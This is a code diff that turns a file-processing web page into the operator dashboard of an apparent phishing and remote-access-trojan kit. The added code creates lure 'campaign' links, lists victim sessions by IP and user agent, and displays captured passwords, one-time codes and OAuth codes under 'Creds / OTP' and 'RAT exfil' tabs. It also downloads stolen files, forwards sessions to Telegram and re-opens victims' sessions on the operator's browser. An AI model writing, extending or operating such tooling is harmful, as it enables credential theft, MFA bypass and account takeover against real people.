+    renderCampaigns();
+  } catch(_) {}
+}
 
-            consoleLog.innerText = `[${new Date().toLocaleTimeString()}] Task initiated... Uploading ${fileInput.name} to server.\n`;
+function renderCampaigns() {
+  const C = $("camps");
+  if (!S.campaigns.length) {
+    C.innerHTML = '<div class="empty">No campaign links yet — paste a URL above.</div>';
+    return;
+  }
+  C.innerHTML = S.campaigns.map(c => `
+    <div class="camp">
+      <span class="cname">${esc(c.id)}</span>
+      <span class="curl" title="${esc(c.target_url)}">${esc(c.target_url)}</span>
+      <button class="cbtn" onclick="copyLink('${esc(c.id)}')">📋 link</button>
+      <button class="cbtn del" onclick="delCampaign('${esc(c.id)}')">🗑</button>
+    </div>`).join("");
+}
 
-            const formData = new FormData();
-            formData.append("file", fileInput);
-            formData.append("column_mapping", document.getElementById("column-mapping").value);
-            formData.append("return_format", document.getElementById("return-format").value);
-            formData.append("split_mode", document.getElementById("split-mode").value);
-            formData.append("items_per_part", document.getElementById("items-per-part").value);
-            formData.append("naming_convention", document.getElementById("naming-convention").value);
+function copyLink(id) {
+  const c = S.campaigns.find(x => x.id === id);
+  if (!c) return;
+  navigator.clipboard.writeText(c.link).then(() => {
+    const el = event.target;
+    const t = el.textContent; el.textContent = "✓";
+    setTimeout(() => el.textContent = t, 1200);
+  });
+}
 
-            const token = document.getElementById("auth-token").value.trim();
+async function delCampaign(id) {
+  if (!confirm("delete campaign " + id + "?")) return;
+  await api("/api/admin/campaigns/" + id, { method: "DELETE" });
+  loadCampaigns();
+}
 
-            try {
-                const res = await fetch(`${activeApiUrl}/api/process-file`, {
-                    method: "POST",
-                    headers: { "Authorization": `Bearer ${token}` },
-                    body: formData
-                });
+$("createBtn").addEventListener("click", async () => {
+  const url = $("urlInput").value.trim();
+  const name = $("nameInput").value.trim();
+  if (!url) { alert("paste a URL first"); return; }
+  const b = $("createBtn");
+  b.disabled = true; b.textContent = "creating…";
+  try {
+    const r = await api("/api/admin/campaigns", {
+      method: "POST", body: { url, name }
+    });
+    if (!r.ok) { alert(r.error || "failed"); return; }
+    $("urlInput").value = ""; $("nameInput").value = "";
+    await loadCampaigns();
+    const camp = S.campaigns.find(c => c.id === r.name);
+    if (camp) {
+      try { await navigator.clipboard.writeText(camp.link); } catch(_) {}
+      alert("Created. Link copied:\n\n" + camp.link);
+    }
+  } finally {
+    b.disabled = false; b.textContent = "🔗 Create Link";
+  }
+});
 
-                const data = await res.json();
-                if (res.ok) {
-                    consoleLog.innerText += `[SUCCESS] ${data.message}\nGenerated files:\n` + data.files.map(f => `  • ${f}`).join("\n");
-                } else {
-                    consoleLog.innerText += `[ERROR] ${data.error || "Processing failed."}`;
-                    alert(data.error || "Processing failed.");
-                }
-            } catch (err) {
-                consoleLog.innerText += `[CRITICAL ERROR] Network or execution error occurred.`;
-            } finally {
-                // Reset button state
-                btnText.innerText = "Execute Bot Processor";
-                btnIcon.setAttribute("data-lucide", "play");
-                btnIcon.classList.remove("animate-spin");
-                lucide.createIcons();
-            }
-        }
-    </script>
+async function loadSessions() {
+  try {
+    const j = await api("/api/admin/sessions");
+    S.sessions = j.sessions || [];
+    $("statBadge").textContent = `${S.sessions.length} sessions · ${j.devices} devices`;
+    if (S.sel && !S.sessions.find(s => s.id === S.sel)) {
+      S.sel = null;
+      $("detail").innerHTML = '<div class="empty">Select a session</div>';
+    }
+    renderSessions();
+  } catch(_) {}
+}
+
+function renderSessions() {
+  const L = $("list");
+  L.innerHTML = S.sessions.map(s => `
+    <div class="sess ${S.sel===s.id?'sel':''}" data-sid="${s.id}">
+      <div>
+        <div class="sid">${esc(s.id)}</div>
+        <div class="ip">${esc(s.ip)} · ${esc(s.campaign||'—')}</div>
+      </div>
+      <span class="st ${esc(s.status)}">${esc(s.status)}</span>
+    </div>`).join("") || '<div class="empty">no sessions yet</div>';
+  L.querySelectorAll(".sess").forEach(el => el.onclick = () => {
+    S.sel = el.dataset.sid;
+    renderSessions();
+    loadDetail(S.sel);
+  });
+}
+
+async function loadDetail(sid) {
+  const d = await api("/api/admin/session/" + sid);
+  const cap = d.captures || [], ex = d.exfil || [], fs = d.files || [];
+
+  const capBlock = k => cap.filter(c => c.kind === k).map(c => `
+    <div class="box"><span class="kind ${k}">${esc(k)}</span>
+      <span style="color:var(--mut);font-size:11px">${fmt(c.ts)}</span>
+      <pre>${esc(c.body)}</pre></div>`).join("") || '<div class="empty">none</div>';
+
+  const byKind = {};
+  ex.forEach(e => (byKind[e.kind] = byKind[e.kind] || []).push(e));
+  const exHtml = Object.entries(byKind).map(([k, rows]) => `
+    <h3 style="font-size:12px;color:var(--mut);margin:14px 0 6px">${esc(k)} (${rows.length})</h3>
+    ${rows.slice(-30).map(r => `
+      <div class="box"><span class="kind ${esc(k)}">${esc(k)}</span>
+        <span style="color:var(--mut);font-size:11px">${fmt(r.ts)} · ${esc(r.ip||'')}</span>
+        <pre>${esc((r.body||'').slice(0,2500))}</pre></div>`).join("")}`
+    ).join("") || '<div class="empty">none</div>';
+
+  const filesHtml = fs.map(f => `
+    <div class="box">
+      <a href="${S.api}/api/admin/file/${f.id}?t=${encodeURIComponent(S.token)}"
+         onclick="dlFile(event, ${f.id})">${esc(f.filename)}</a>
+      <span style="color:var(--mut);font-size:11px"> · ${f.size} bytes · ${fmt(f.ts)}</span>
+    </div>`).join("") || '<div class="empty">none</div>';
+
+  const browserUrl = d.browser_url || "";
+
+  $("detail").innerHTML = `
+    <h1 style="margin:0 0 12px;font-family:ui-monospace,monospace;
+      color:var(--gold);font-size:16px">${esc(sid)}</h1>
+    <div class="box">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:12px">
+        <div><b>IP</b> ${esc(d.ip||'')}</div>
+        <div><b>Campaign</b> ${esc(d.campaign||'—')}</div>
+        <div><b>Status</b> <span class="st ${esc(d.status)}">${esc(d.status)}</span></div>
+        <div><b>Provider</b> ${esc(d.provider||'—')}</div>
+        <div style="grid-column:1/-1"><b>UA</b> ${esc(d.ua||'—')}</div>
+        <div style="grid-column:1/-1"><b>Target</b>
+          <code style="word-break:break-all">${esc(d.target_url||'—')}</code></div>
+        ${browserUrl ? `<div style="grid-column:1/-1"><b>Now on (PC)</b>
+          <code style="word-break:break-all">${esc(browserUrl)}</code></div>` : ''}
+        <div><b>Created</b> ${fmt(d.created)}</div>
+        <div><b>Approved</b> ${fmt(d.approved)}</div>
+      </div>
+    </div>
+    <div style="margin:14px 0">
+      <button class="btn green" onclick="approveSid('${sid}')">✓ Approve</button>
+      <button class="btn blue" onclick="reopenSid('${sid}')">🖥 Re-open on PC</button>
+      <button class="btn gold" onclick="zipSid('${sid}')">📦 .zip</button>
+      <button class="btn" onclick="tgSid('${sid}')">📤 Telegram</button>
+      <button class="btn gray" onclick="closeSid('${sid}')">✕ Close tab</button>
+      <button class="btn red" onclick="delSid('${sid}')">🗑 Delete</button>
+    </div>
+    <div class="tabs">
+      <div class="tab on" data-t="creds">Creds / OTP</div>
+      <div class="tab" data-t="exfil">RAT exfil</div>
+      <div class="tab" data-t="files">Files</div>
+    </div>
+    <div id="tab-creds">
+      ${capBlock("creds")}${capBlock("otp_code")}
+      ${capBlock("oauth_code")}${capBlock("oauth_error")}
+    </div>
+    <div id="tab-exfil" style="display:none">${exHtml}</div>
+    <div id="tab-files" style="display:none">${filesHtml}</div>`;
+
+  document.querySelectorAll(".tab").forEach(t => t.onclick = () => {
+    document.querySelectorAll(".tab").forEach(x => x.classList.remove("on"));
+    t.classList.add("on");
+    ["creds","exfil","files"].forEach(k =>
+      $("tab-" + k).style.display = t.dataset.t === k ? "block" : "none");
+  });
+}
+
+async function dlFile(ev, fid) {
+  ev.preventDefault();
+  const r = await fetch(S.api + "/api/admin/file/" + fid, {
+    headers: { "X-Admin-Token": S.token }
+  });
+  const blob = await r.blob();
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "file-" + fid;
+  a.click();
+}
+
+async function approveSid(sid)  { await api("/api/admin/approve/" + sid, {method:"POST"}); refreshAll(); loadDetail(sid); }
+async function reopenSid(sid)   {
+  const s = S.sessions.find(x => x.id === sid);
+  if (!s) return;
+  const target = s.target_url || "";
+  if (!target) { alert("no target url"); return; }
+  await api("/api/session/" + sid + "/accept", {method:"POST"});
+  alert("sent to PC");
+}
+async function closeSid(sid)    { await api("/api/admin/session/" + sid + "/close", {method:"POST"}); alert("closed"); }
+async function zipSid(sid) {
+  const r = await fetch(S.api + "/api/admin/zip/" + sid, {
+    headers: { "X-Admin-Token": S.token }
+  });
+  const blob = await r.blob();
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "session-" + sid + ".zip";
+  a.click();
+}
+async function tgSid(sid) {
+  const r = await api("/api/admin/tg/" + sid, {method:"POST"});
+  alert(r.ok ? "sent" : "failed: " + (r.error||"?"));
+}
+async function delSid(sid) {
+  if (!confirm("delete " + sid + "?")) return;
+  await api("/api/admin/session/" + sid, {method:"DELETE"});
+  S.sel = null;
+  refreshAll();
+  $("detail").innerHTML = '<div class="empty">Select a session</div>';
+}
+
+async function wipeProfile() {
+  if (!confirm("wipe the Chrome profile? This closes the browser and clears cookies.")) return;
+  await api("/api/admin/wipe-profile", {method:"POST"});
+  loadBrowser();
+}
+
+// auto-refresh
+setInterval(() => {
+  if ($("panel").classList.contains("hidden")) return;
+  loadBrowser();
+  loadSessions();
+  if (S.sel) loadDetail(S.sel);
+}, 5000);
+setInterval(() => {
+  if ($("panel").classList.contains("hidden")) return;
+  loadCampaigns();
+}, 30000);
+</script>
 </body>
 </html>
